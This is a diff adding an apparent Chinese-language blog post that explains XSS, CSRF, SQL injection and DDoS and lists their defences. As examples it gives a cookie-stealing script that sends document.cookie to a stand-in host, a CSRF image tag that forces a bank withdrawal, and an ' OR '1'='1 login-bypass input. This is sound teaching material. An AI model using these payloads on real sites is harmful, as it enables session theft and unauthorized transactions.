@@ -1,0 +1,231 @@
+<blockquote>
+  <p>摘要：XSS 跨站脚本攻击、CSRF 跨站请求伪造、SQL 注入、DDoS 拒绝服务攻击。</p>
+</blockquote>
+
+<!-- more -->
+
+<hr />
+
+<h2 id="目录">目录</h2>
+
+<p>[TOC]</p>
+
+<h2 id="一xss-跨站脚本攻击">一、XSS 跨站脚本攻击</h2>
+
+<h3 id="概念">概念</h3>
+
+<p>跨站脚本攻击（Cross-Site Scripting, <strong>XSS</strong>），可以<strong>将代码注入</strong>到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
+
+<h3 id="攻击原理">攻击原理</h3>
+
+<p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"//domain.com/?c="</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>之后该内容可能会被渲染成以下形式：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;&lt;script&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"//domain.com/?c="</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="nt">&lt;/script&gt;&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了<strong>当前作用域的 Cookie</strong>。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
+
+<h3 id="危害">危害</h3>
+
+<ul>
+  <li>窃取用户的 Cookie</li>
+  <li>伪造虚假的输入表单骗取个人信息</li>
+  <li>显示伪造的文章或者图片</li>
+</ul>
+
+<h3 id="防范手段">防范手段</h3>
+
+<h4 id="1-设置-cookie-为-httponly">1. 设置 Cookie 为 HttpOnly</h4>
+
+<p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p>
+
+<h4 id="2-过滤特殊字符">2. 过滤特殊字符</h4>
+
+<p>例如将 <code class="highlighter-rouge">&lt;</code> <strong>标签转义</strong>为 <code class="highlighter-rouge">&amp;lt;</code>，将 <code class="highlighter-rouge">&gt;</code> 转义为 <code class="highlighter-rouge">&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p>
+
+<ul>
+  <li><strong>富文本编辑器</strong>允许用户输入 HTML 代码，就不能简单地将 <code class="highlighter-rouge">&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</li>
+  <li>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些<strong>标签白名单</strong>或者黑名单，从而不允许<strong>有攻击性的 HTML 代码</strong>的输入。</li>
+</ul>
+
+<blockquote>
+  <p><a href="http://jsxss.com/zh/try.html">XSS 过滤在线测试</a></p>
+</blockquote>
+
+<p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1</span> <span class="na">id=</span><span class="s">"title"</span><span class="nt">&gt;</span>XSS Demo<span class="nt">&lt;/h1&gt;</span>
+
+<span class="nt">&lt;p&gt;</span>123<span class="nt">&lt;/p&gt;</span>
+
+<span class="nt">&lt;form&gt;</span>
+  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"test"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+
+<span class="nt">&lt;pre&gt;</span>hello<span class="nt">&lt;/pre&gt;</span>
+
+<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
+<span class="nx">alert</span><span class="p">(</span><span class="sr">/xss/</span><span class="p">);</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>XSS Demo<span class="nt">&lt;/h1&gt;</span>
+
+<span class="nt">&lt;p&gt;</span>123<span class="nt">&lt;/p&gt;</span>
+
+<span class="ni">&amp;lt;</span>form<span class="ni">&amp;gt;</span>
+  <span class="ni">&amp;lt;</span>input type="text" name="q" value="test"<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/form<span class="ni">&amp;gt;</span>
+
+<span class="nt">&lt;pre&gt;</span>hello<span class="nt">&lt;/pre&gt;</span>
+
+<span class="ni">&amp;lt;</span>script type="text/javascript"<span class="ni">&amp;gt;</span>
+alert(/xss/);
+<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
+</code></pre></div></div>
+
+<h2 id="二csrf-跨站请求伪造">二、CSRF 跨站请求伪造</h2>
+
+<h3 id="概念-1">概念</h3>
+
+<p>跨站请求伪造（Cross-site request forgery，<strong>CSRF</strong>），是攻击者通过一些技术手段<strong>欺骗用户的浏览器</strong>去访问一个自己<strong>曾经认证过</strong>的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。</p>
+
+<p>由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p>
+
+<ul>
+  <li>XSS 利用的是用户对指定网站的信任，</li>
+  <li>CSRF 利用的是网站对用户浏览器的信任。</li>
+</ul>
+
+<h3 id="攻击原理-1">攻击原理</h3>
+
+<p>假如一家银行用以执行转账操作的 URL 地址如下：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。
+</code></pre></div></div>
+
+<p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src="http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman"&gt;。
+</code></pre></div></div>
+
+<p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，<strong>登录信息尚未过期</strong>，那么她就会损失 1000 美元。</p>
+
+<p>此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
+
+<p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
+
+<h3 id="防范手段-1">防范手段</h3>
+
+<h4 id="1-检查-referer-首部字段">1. 检查 Referer 首部字段</h4>
+
+<p>Referer 首部字段位于 <strong>HTTP 报文</strong>中，用于标识<strong>请求来源</strong>的地址。检查这个首部字段并要求请求来源的地址在<strong>同一个域名</strong>下，可以极大的防止 CSRF 攻击。</p>
+
+<p>仅需要在关键访问处增加一步校验。但也有局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，<strong>篡改</strong>其 Referer 字段的可能。</p>
+
+<h4 id="2-添加校验-token">2. 添加校验 Token</h4>
+
+<p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成<strong>随机数</strong>并附加在表单中，并要求客户端传回这个随机数。</p>
+
+<h4 id="3-输入验证码">3. 输入验证码</h4>
+
+<p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p>
+
+<h2 id="三sql-注入攻击">三、SQL 注入攻击</h2>
+
+<h3 id="概念-2">概念</h3>
+
+<p>服务器上的数据库运行非法的 SQL 语句，主要通过<strong>拼接</strong>来完成。</p>
+
+<h3 id="攻击原理-2">攻击原理</h3>
+
+<p>常见的SQL 注入方式：通过网页输入框（<code class="highlighter-rouge">&lt;input&gt; 、&lt;textarea&gt;</code> 标签等）将恶意 SQL 代码提交给服务器。将 userName 参数拼接到 SQL 语句中，从而构建 SELECT 查询，从数据库中获取当前用户的所有信息。</p>
+
+<p>例如一个网站登录验证的 SQL 查询代码为：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">strSQL</span> <span class="o">=</span> <span class="nv">"SELECT * FROM users WHERE (name = '"</span> <span class="o">+</span> <span class="n">userName</span> <span class="o">+</span> <span class="nv">"') and (pw = '"</span><span class="o">+</span> <span class="n">passWord</span> <span class="o">+</span><span class="nv">"');"</span>
+</code></pre></div></div>
+
+<p>如果填入以下内容：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">userName</span> <span class="o">=</span> <span class="nv">"1' OR '1'='1"</span><span class="p">;</span>
+<span class="n">passWord</span> <span class="o">=</span> <span class="nv">"1' OR '1'='1"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>那么 SQL 查询字符串为：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">strSQL</span> <span class="o">=</span> <span class="nv">"SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"</span>
+</code></pre></div></div>
+
+<p>此时无需验证通过就能执行以下查询：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">strSQL</span> <span class="o">=</span> <span class="nv">"SELECT * FROM users;"</span>
+</code></pre></div></div>
+
+<h3 id="防范手段-2">防范手段</h3>
+
+<h4 id="1-使用参数化查询">1. 使用参数化查询</h4>
+
+<p>Java 中的 <code class="highlighter-rouge">PreparedStatement</code> 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于<strong>没有拼接的过程</strong>，因此可以防止 SQL 注入的发生。</p>
+
+<ul>
+  <li>传参用参数占位符 <code class="highlighter-rouge">#{}</code>，尽量避免用变量占位符 <code class="highlighter-rouge">${}</code>；</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PreparedStatement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="s">"SELECT * FROM users WHERE userid=? AND password=?"</span><span class="o">);</span>
+<span class="n">stmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">userid</span><span class="o">);</span>
+<span class="n">stmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">password</span><span class="o">);</span>
+<span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
+</code></pre></div></div>
+
+<h4 id="2-数据验证">2. 数据验证</h4>
+
+<p><strong>服务端数据验证</strong>是在数据提交到服务器上后再验证。<strong>客户端数据验证</strong>是在数据发送到服务器前，在浏览器上完成验证，包括 HTML5 内置约束验证、JavaScript 自定义表单验证、CSS 伪类选择器。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form&gt;
+  &lt;label for="email"&gt;Email:&lt;/label&gt;
+  &lt;input type="email" id="email" name="email" required&gt;
+  &lt;input type="submit" value="Submit"&gt;
+&lt;/form&gt;
+// required 属性确保用户必须输入电子邮件地址，而 type="email" 会自动验证输入是否为有效的电子邮件格式。
+// 使用正则表达式进行验证
+</code></pre></div></div>
+
+<h4 id="3-检测用户输入">3. 检测用户输入</h4>
+
+<p>永远不要信任用户提供的数据，仅在校验通过后才将数据提交给数据库。如：</p>
+
+<ol>
+  <li>在页面输入参数时进行字符串检测；</li>
+  <li>提交时进行参数检查、用正则表达式过滤参数中的特殊符号等；
+    <ol>
+      <li><strong>单引号转换</strong>：将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</li>
+    </ol>
+  </li>
+  <li>Spring Boot 整合 <code class="highlighter-rouge">Hibenate-Validator</code> 框架；</li>
+  <li>用户输入的 SQL 参数严格使用参数绑定或 METADATA 字段值限定，禁止字符串拼接 SQL 访问数据库。</li>
+</ol>
+
+<h4 id="4-web-防火墙">4. Web 防火墙</h4>
+
+<p>Web 防火墙可检测和阻止最基本的 SQL 注入；</p>
+
+<h2 id="四ddos-拒绝服务攻击">四、DDoS 拒绝服务攻击</h2>
+
+<p>拒绝服务攻击（denial-of-service attack，<strong>DoS</strong>），亦称洪水攻击，其目的在于使目标电脑的网络或系统<strong>资源耗尽</strong>，使服务暂时中断或停止，导致其<strong>正常用户</strong>无法访问。</p>
+
+<p>分布式拒绝服务攻击（distributed denial-of-service attack，<strong>DDoS</strong>），指攻击者使用两个或以上被攻陷的电脑作为“<strong>僵尸</strong>”向特定的目标发动“拒绝服务”式攻击。</p>
+
+<h2 id="参考资料">参考资料</h2>
+
+<ul>
+  <li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">维基百科：跨站脚本</a></li>
+  <li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A">维基百科：SQL 注入攻击</a></li>
+  <li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">维基百科：跨站点请求伪造</a></li>
+  <li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A">维基百科：拒绝服务攻击</a></li>
+</ul>
